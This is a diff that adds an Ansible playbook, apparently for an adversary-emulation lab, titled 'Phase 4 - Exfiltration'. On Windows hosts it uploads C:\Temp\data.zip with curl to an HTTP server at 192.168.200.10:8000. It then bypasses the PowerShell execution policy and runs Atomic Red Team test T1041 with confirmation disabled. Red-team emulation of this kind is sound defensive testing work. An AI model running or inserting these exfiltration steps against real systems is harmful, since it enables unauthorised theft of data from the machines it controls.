@@ -1,0 +1,20 @@
+---
+- name: Phase 4 - Exfiltration
+  hosts: windows
+  gather_facts: no
+
+  tasks:
+    - name: Exfil file (real behavior)
+      win_command: C:\Windows\System32\curl.exe -X POST -F "file=@C:\Temp\data.zip" http://192.168.200.10:8000
+      register: exfil_output
+      ignore_errors: yes
+
+    - debug:
+        var: exfil_output.stdout
+
+    - name: Atomic Exfil (T1041)
+      win_shell: |
+        Set-ExecutionPolicy Bypass -Scope Process -Force
+        Import-Module powershell-yaml
+        Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1"
+        Invoke-AtomicTest T1041 -Confirm:$false
